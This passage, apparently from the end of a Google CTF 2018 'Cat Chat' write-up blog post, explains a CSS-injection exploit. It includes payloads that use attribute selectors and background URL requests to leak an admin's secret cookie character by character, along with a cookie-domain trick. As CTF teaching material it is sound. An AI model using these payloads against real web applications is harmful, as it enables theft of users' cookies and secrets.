+<p>Here comes the 2nd bug ( no input sanitisation ) into play, use it to enter an invalid domain for the cookie, thus avoiding setting the cookie. However the original <em><strong>flag</strong></em> cookie would be printed cause <strong>secret</strong> command is issued :</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">secret</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span> <span class="nx">display</span><span class="p">(</span><span class="sb">`Successfully changed secret to *****`</span><span class="p">);</span> <span class="p">},</span>
+</code></pre></div>
+<p>And we know it is set because it&rsquo;s already mentioned in the source :</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="c1">// Note: the admin will already have their secret set in the cookie (it&#39;s a cookie with long expiration)
+</span><span class="c1"></span></code></pre></div>
+<h2 id="the-battle-plan">The Battle Plan</h2>
+
+<ol>
+<li>Join two users, one will be banning the other</li>
+<li>The user who&rsquo;s being banned will have the payload which will be executed onto the chat window</li>
+<li>Auto reset the cookies using <strong>deleteAllCookies</strong>, cause we have to exfil data <em>char-by-char</em></li>
+<li>Automate the whole process ( Later thought so, as much as possible )</li>
+</ol>
+
+<p>First to test this I wrote a small payload and then added this to the script :</p>
+<div class="highlight"><pre class="chroma"><code class="language-css" data-lang="css"><span class="o">/</span><span class="nt">name</span> <span class="nt">leaker</span> <span class="o">]</span> <span class="p">{}</span> <span class="nt">span</span><span class="o">[</span><span class="nt">data-secret</span><span class="o">^=</span><span class="nt">CTF</span><span class="err">\</span><span class="p">{</span><span class="err">]</span> <span class="err">{</span><span class="k">background</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="sx">/room/3fa91dea-2fc6-4e0f-a614-8243c50e62d8/send?name=admin&amp;msg=CTF{}</span><span class="p">);}</span></code></pre></div>
+<p><strong>The output :</strong></p>
+
+
+
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://lud1161.files.wordpress.com/2018/06/not_working.png" alt="Not Working - As other user is banned but no message"/>
+    </div>
+      <figcaption>
+          <p>Not Working - As other user is banned but no message</p>
+      </figcaption>
+    <a href="https://lud1161.files.wordpress.com/2018/06/not_working.png" itemprop="contentUrl"></a>
+  </figure>
+</div>
+
+<p>So, it didn&rsquo;t work, WHAT.</p>
+
+<p>It can&rsquo;t be, I looked into it for long, after hours of mind boggling, I asked the admin, he/she told me that admin resets every time it visits the chat.</p>
+
+<p>Okay, so I have to execute the <strong>secret</strong> command and exfil data in one go, no problem.</p>
+
+<p>So my new payload goes like this :</p>
+<div class="highlight"><pre class="chroma"><code class="language-css" data-lang="css"><span class="o">/</span><span class="nt">name</span> <span class="nt">leaker</span> <span class="o">]</span> <span class="p">{</span><span class="k">color</span><span class="p">:</span><span class="kc">blue</span><span class="p">;</span> <span class="k">background</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="sx">/room/84b4b69a-d01d-45c3-b2c5-eb5d55abd734/send?name=admin&amp;msg=/secret CTF{this_cant_be_set}; Domain=somecompany.co.uk</span><span class="p">);}</span> <span class="p">{}</span> <span class="nt">span</span><span class="o">[</span><span class="nt">data-secret</span><span class="o">^=</span><span class="nt">CTF</span><span class="err">\</span><span class="p">{</span><span class="err">]</span> <span class="err">{</span><span class="k">background</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="sx">/room/84b4b69a-d01d-45c3-b2c5-eb5d55abd734/send?name=admin&amp;msg=CTF{}</span><span class="p">);}</span></code></pre></div>
+<p><strong>The Output :</strong></p>
+
+
+
+<div class="box" >
+  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <div class="img">
+      <img itemprop="thumbnail" src="https://lud1161.files.wordpress.com/2018/06/leaking_data.png" alt="Finally Data was being leaked"/>
+    </div>
+      <figcaption>
+          <p>Finally Data was being leaked</p>
+      </figcaption>
+    <a href="https://lud1161.files.wordpress.com/2018/06/leaking_data.png" itemprop="contentUrl"></a>
+  </figure>
+</div>
+
+<p>So, I wrote a small python script that would generate the payload into two text files ( the total charset length is 92 , and adding it to each payload would make the <strong>GET</strong> request too large, so split it into chunks. Check <a href="https://stackoverflow.com/a/2659995">here</a> )</p>
+
+<script src="//gist.github.com/LuD1161/8f4fec2dd2bc24fe5d0036ae41159c41.js"></script>
+
+<p>The python script generates 2 files with the payloads. It runs in a continuous loop to take input from the user ( user will enter the next character that is returned by the admin ) and will append it to the original payload , thus updating the payload files.</p>
+
+<p>Here you can see my final work, extracting the flag from admin :</p>
+
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="//www.youtube.com/embed/TR6wPTkD0Io" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+
+<p>Kudos to the google team for making such a good question 🎉🎉🎉</p>
+
+<p>Thanks.</p>
+
+
+        
+          <div class="blog-tags">
+            
+              <a href="https://lud1161.github.io//tags/google-ctf/">google-ctf</a>&nbsp;
+            
+              <a href="https://lud1161.github.io//tags/css-injection/">css-injection</a>&nbsp;
+            
+              <a href="https://lud1161.github.io//tags/ctf/">ctf</a>&nbsp;
+            
+              <a href="https://lud1161.github.io//tags/writeup/">writeup</a>&nbsp;
+            
+          </div>
+        
+
+        
+            <hr/>
+            <section id="social-share">
+              <ul class="list-inline footer-links">
+                
+
+
+<li>
+    <a href="//twitter.com/share?url=https%3a%2f%2flud1161.github.io%2fposts%2f2018-07-02-cat-chat-googlectf-writeup%2f&amp;text=Cat%20Chat%20Google-CTF%20%2718%20Writeup&amp;via=LuD1161"
+       target="_blank" alt="" title="Share on Twitter">
+        <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+
+<li>
+    <a href="//plus.google.com/share?url=https%3a%2f%2flud1161.github.io%2fposts%2f2018-07-02-cat-chat-googlectf-writeup%2f" target="_blank" title="Share on Google Plus">
+         <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-google-plus fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+
+<li>
+    <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2flud1161.github.io%2fposts%2f2018-07-02-cat-chat-googlectf-writeup%2f" target="_blank" title="Share on Facebook">
+        <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+
+<li>
+    <a href="//reddit.com/submit?url=https%3a%2f%2flud1161.github.io%2fposts%2f2018-07-02-cat-chat-googlectf-writeup%2f&amp;title=Cat%20Chat%20Google-CTF%20%2718%20Writeup" target="_blank" title="Share on Reddit">
+         <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-reddit fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+
+<li>
+    <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2flud1161.github.io%2fposts%2f2018-07-02-cat-chat-googlectf-writeup%2f&amp;title=Cat%20Chat%20Google-CTF%20%2718%20Writeup" target="_blank"
+       title="Share on LinkedIn">
+         <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+
+<li>
+    <a href="//www.stumbleupon.com/submit?url=https%3a%2f%2flud1161.github.io%2fposts%2f2018-07-02-cat-chat-googlectf-writeup%2f&amp;title=Cat%20Chat%20Google-CTF%20%2718%20Writeup" target="_blank"
+       title="Share on StumbleUpon">
+        <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-stumbleupon fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+
+<li>
+    <a href="//www.pinterest.com/pin/create/button/?url=https%3a%2f%2flud1161.github.io%2fposts%2f2018-07-02-cat-chat-googlectf-writeup%2f&amp;description=Cat%20Chat%20Google-CTF%20%2718%20Writeup" target="_blank"
+       title="Share on Pinterest">
+         <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-pinterest fa-stack-1x fa-inverse"></i>
+              </span>
+    </a>
+</li>
+
+              </ul>
+            </section>
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+          
+        </ul>
+      
+
+
+      
+        
+          <div class="disqus-comments">
+            <div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "lud1161-github-io" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+          </div>
+        
+        
+      
+
+    </div>
+  </div>
+</div>
+
+    <footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+              <li>
+                <a href="https://www.facebook.com/AseemShrey" title="Facebook">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://github.com/LuD1161" title="GitHub">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://twitter.com/LuD1161" title="Twitter">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://linkedin.com/in/aseem-shrey-18b08526" title="LinkedIn">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://www.youtube.com/channel/UCdmYjIVJArISn6Eo7RoVdLQ" title="Youtube">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-youtube fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://keybase.io/aseemshrey" title="Keybase">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-key fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+          
+          <li>
+            
+            <a href="https://lud1161.github.io/index.xml" title="RSS">
+            
+              <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+            
+              Aseem Shrey
+            
+          
+
+          &nbsp;&bull;&nbsp;
+          2018
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://lud1161.github.io/">LuD1161&#39;s Blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="http://gohugo.io">Hugo v0.42.1</a> powered &nbsp;&bull;&nbsp; Theme by <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a> adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.js" integrity="sha384-/y1Nn9+QQAipbNQWU65krzJralCnuOasHncUFXGkdwntGeSvQicrYkiUBwsgUqc1" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/contrib/auto-render.min.js" integrity="sha384-dq1/gEHSxPZQ7DdrM82ID4YVol9BYyU7GbWlIwnwyPzotpoc57wDw/guX8EaYGPx" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+<script src="https://lud1161.github.io/js/main.js"></script><script> renderMathInElement(document.body); </script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script>
+<script src="https://lud1161.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+  </body>
+</html>
+
